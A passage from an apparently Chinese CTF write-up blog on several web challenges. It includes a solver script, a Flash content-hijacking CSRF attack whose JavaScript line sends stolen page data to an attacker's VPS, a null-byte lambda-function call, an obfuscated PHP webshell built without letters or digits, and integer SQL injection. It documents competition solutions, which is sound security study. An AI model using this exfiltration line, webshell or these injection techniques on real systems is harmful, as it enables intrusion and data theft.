class="number">0</span>,<span class="number">100</span>); </span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">100</span>); </span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">100</span>); </span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">100</span>); </span><br><span class="line"><span class="variable">$e</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = (((<span class="variable">$a</span> - <span class="variable">$b</span>)/<span class="variable">$c</span>)+<span class="variable">$d</span>) * <span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>.<span class="variable">$result</span>.<span class="variable">$key</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后一个提交页面,然后我还以为是什么绕过,然后还猜弱类型,搞了半天做不出来,看了wp发现也是神奇好吧,它是用时间种子生成随机数然后加盐md5,<strong>随机提交一个md5的值</strong>就可以在源码里获得加密结果,然后再把结果提交就好了,打扰了,确实没看懂这个出题思路好吧.. 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">url=<span class="string">&quot;http://101.71.29.5:10003/flag.php&quot;</span></span><br><span class="line">data=&#123;<span class="string">&quot;answer&quot;</span>:<span class="string">&quot;0e342768416822451524974117254469&quot;</span>&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line">soup=BeautifulSoup(r.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(soup.p)</span><br><span class="line">md5=re.findall(<span class="string">r&quot;&lt;!--(.*?)--&gt;&quot;</span>,<span class="built_in">str</span>(soup.p))</span><br><span class="line">data=md5[<span class="number">0</span>]</span><br><span class="line">data=&#123;<span class="string">&quot;answer&quot;</span>:data&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h3 id="简历来了">简历来了</h3><p>开始走错了路,想传shell,但其实传不了,源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;init.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">z_validate_captcha</span>())&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;验证码错误&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$email</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>])?<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]):<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$url</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])?<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]):<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$file</span> = <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])?<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]:<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$email</span> == <span class="literal">false</span>  <span class="variable">$url</span> == <span class="literal">false</span>  <span class="variable">$file</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Invalid Input&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$email</span>, FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Invalid Email&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$url</span>, FILTER_VALIDATE_URL)  (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;http://&#x27;</span>) !== <span class="number">0</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;https://&#x27;</span>) !== <span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Invalid URL&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>]  <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>*<span class="number">1024</span>  !<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Invalid File&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">getExt</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="keyword">array</span>(<span class="string">&#x27;.jpg&#x27;</span>,<span class="string">&#x27;.jpeg&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.docx&#x27;</span>, <span class="string">&#x27;.doc&#x27;</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Invalid File Type&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$file_checked</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="keyword">array</span>(<span class="string">&#x27;.jpg&#x27;</span>,<span class="string">&#x27;.jpeg&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>)))&#123;</span><br><span class="line">        <span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$finfo</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Opening fileinfo database failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$mime</span> = <span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">finfo_close</span>(<span class="variable">$finfo</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$mime</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Invalid Filename&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;;&#x27;</span>, <span class="variable">$mime</span>);</span><br><span class="line">        <span class="variable">$mime</span> = <span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$mime</span> == <span class="literal">false</span>  !<span class="title function_ invoke__">in_array</span>(<span class="variable">$mime</span>, <span class="keyword">array</span>(<span class="string">&#x27;image/gif&#x27;</span>, <span class="string">&#x27;image/jpeg&#x27;</span>, <span class="string">&#x27;image/jpg&#x27;</span>, <span class="string">&#x27;image/png&#x27;</span>, <span class="string">&#x27;application/octet-stream&#x27;</span>)))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Invalid Filename&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_checked</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="keyword">array</span>(<span class="string">&#x27;.docx&#x27;</span>, <span class="string">&#x27;.doc&#x27;</span>)))&#123;</span><br><span class="line">        <span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$finfo</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Opening fileinfo database failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$mime</span> = <span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">finfo_close</span>(<span class="variable">$finfo</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$mime</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Invalid Filename&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;;&#x27;</span>, <span class="variable">$mime</span>);</span><br><span class="line">        <span class="variable">$mime</span> = <span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$mime</span> == <span class="literal">false</span>  !<span class="title function_ invoke__">in_array</span>(<span class="variable">$mime</span>, <span class="keyword">array</span>(<span class="string">&#x27;application/msword&#x27;</span>,<span class="string">&#x27;application/word&#x27;</span>, <span class="string">&#x27;application/vnd.openxmlformats-officedocument.wordprocessingml.document&#x27;</span>)))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Invalid Filename&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_checked</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_checked</span> !== <span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Invalid File Type&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;./upload/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">microtime</span>()).<span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;上传失败&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">save_resume</span>(<span class="variable">$email</span>, <span class="variable">$url</span>, <span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;提交成功：&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;邮箱：&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$email</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;个人网站：&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;简历地址：&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这里其实是个csrf,我也真是鲸了,我确实有测试链接那个地方有没有bot来访问,但是没有!没有!这个题卡了我两天... 好吧,不过其实就算知道这里会有bot来访问我这道题可能也解不出来,因为考到了一个我并不会的点,这里重点记录一下:<a href="http://www.freebuf.com/articles/web/35353.html" title="Flash跨域数据劫持漏洞">Flash跨域数据劫持漏洞</a> 这个漏洞讲的大致如下: 当某站点存在上传点且并没有检查文件内容的时候,我们就可以上传一个flash文件,然后后缀使用可以上传的后缀,比如jpg之类的,然后核心部分是object标签在包含flash文件时没有对嵌入的文件后缀进行判断。也就是说，只要文件内容包含了正常的flash文件代码，就能够被object标签成功加载并执行。而ActionScript中又有很多api可以让flash发送网络请求,这就可以将flash传到目标域然后构造恶意代码获取某些页面了,具体看题。 很坑爹的一道题，主要是利用了github上一个CSRF项目：<a href="https://github.com/nccgroup/CrossSiteContentHijacking" title="https://github.com/nccgroup/CrossSiteContentHijacking">https://github.com/nccgroup/CrossSiteContentHijacking</a> 限制了邮箱、URL格式，文件大小。以及上传的文件类型和MIME类型。无法绕过上传PHP文件或者利用文件包含上传图片马 第一个点:flash的三种文件头:CWS,FWS,ZWS[最新的] 由于ZWS是新兴的文件格式,php暂时不支持,所以php在解析cws和fws格式的时候会解析成application/x-shockwave-flash;但是解析zws的时候会变成application/octet-stream从而绕过MIME限制。 扫目录发现admin目录,需要管理员才能看flag.那么思路就明确了,我们可以先传一个flash文件上去,然后自己在vps上构造一个攻击页面来加载服务器上的flash,然后填到博客栏让bot去访问,bot访问之后触发flash文件从而打到admin下的flag然后返回到我们的服务器. <strong>具体操作</strong> 克隆一下前面提到的github的那个项目,然后找到ContentHijacking.swf,将文件头改成ZWS <img src="/images/2018/07/hijacking.jpg" alt="blacsheep" /> 然后传到服务器,记录传的路径,然后ContentHijackingLoader.html里面125行左右加上一段代码new Image的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new Image().src=&#x27;http://your_vps/xxx.php&#x27;+encodeURIComponent(strData)</span><br></pre></td></tr></table></figure><p><img src="/images/2018/07/hijacking-2.jpg" alt="blacsheep" /> 然后vps上面打开ContentHijackingLoader.html,填写一下flash的地址和攻击地址,然后生成payload <img src="/images/2018/07/hijacking-3.png" alt="blacsheep" /> 生成之后提交上去就可以在vps收到flag了 这个都是别人写的,环境已经关了,简单记录下 参考链接: <a href="https://liuxianglai.github.io/2018/06/26/%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9BWrite-up/" title="https://liuxianglai.github.io/2018/06/26/%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9BWrite-up/">https://liuxianglai.github.io/2018/06/26/%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9BWrite-up/</a> <a href="http://www.freebuf.com/articles/web/35353.html" title="http://www.freebuf.com/articles/web/35353.html">http://www.freebuf.com/articles/web/35353.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>suctf补题</title>
      <link href="/2018/07/28/suctf%E8%A1%A5%E9%A2%98/"/>
      <url>/2018/07/28/suctf%E8%A1%A5%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>很久以前的比赛了,工作室同学说有docker,就用他的docker复现一下吧</p><h2 id="anonymous">Anonymous</h2><p><strong>描述:PHP是最好的语言，不是吗?</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$MY</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;die(`cat flag.php`);&quot;</span>);</span><br><span class="line"><span class="variable">$hash</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;function SUCTF_<span class="subst">$hash</span>()&#123;&quot;</span></span><br><span class="line">    .<span class="string">&quot;global \$MY;&quot;</span></span><br><span class="line">    .<span class="string">&quot;\$MY();&quot;</span></span><br><span class="line">    .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_GET</span>[<span class="string">&quot;func_name&quot;</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>hitcon2017的baby^master那道题的第二个点,匿名函数名通过多线程预测</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?func_name=%00lambda_1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>118.24.125.87:84</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/§5§.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=rkb49l8crfqltdncen0brqotc5</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/2018/08/su-1.jpg" alt="blacsheep" /> 拿到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;fake_flag_web_a&#125;</span><br></pre></td></tr></table></figure><h2 id="getshell">getshell</h2><p>文件上传题 给了部分源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$contents</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_char</span> <span class="keyword">as</span> <span class="variable">$b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>burp单字符跑黑名单 <img src="/images/2018/08/su-2.jpg" alt="blacsheep" /> 发现能用的字符很少,所有的字母数字都被ban了,想到p师傅博客里的绕过数字字母的webshell <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" title="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a> 看到第一个版本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;的&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;半&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;始&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;俯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;次&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;站&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br></pre></td></tr></table></figure><p>但是这里不能有<code>&gt;,&lt;,/</code> 所以替换一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=([]==[]);</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$___</span>=瞰;<span class="variable">$____</span>=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);<span class="variable">$___</span>=次;<span class="variable">$____</span>.=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);<span class="variable">$___</span>=次;<span class="variable">$____</span>.=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);<span class="variable">$___</span>=的;<span class="variable">$____</span>.=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);<span class="variable">$___</span>=半;<span class="variable">$____</span>.=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);<span class="variable">$___</span>=站;<span class="variable">$____</span>.=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);</span><br><span class="line"><span class="variable">$_____</span>=_;<span class="variable">$___</span>=母;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);<span class="variable">$___</span>=少;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);<span class="variable">$___</span>=次;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);<span class="variable">$___</span>=站;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>[<span class="variable">$_</span>]);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br></pre></td></tr></table></figure><p>shell的密码是1 <img src="/images/2018/08/su-3.jpg" alt="blacsheep" /></p><h2 id="multisql">MultiSql</h2><p><strong>描述:刚入坑的小方写了个漏洞信息平台，听说这个平台存在漏洞，你能利用吗？</strong> 简单测试,发现id存在注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.24.125.87:82/user/user.php?id=1</span><br></pre></td></tr></table></figure><p>整形注入,过滤了一些东西,不过无所谓还是可以注. 进一步测试,发现可以读取文件 写个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td 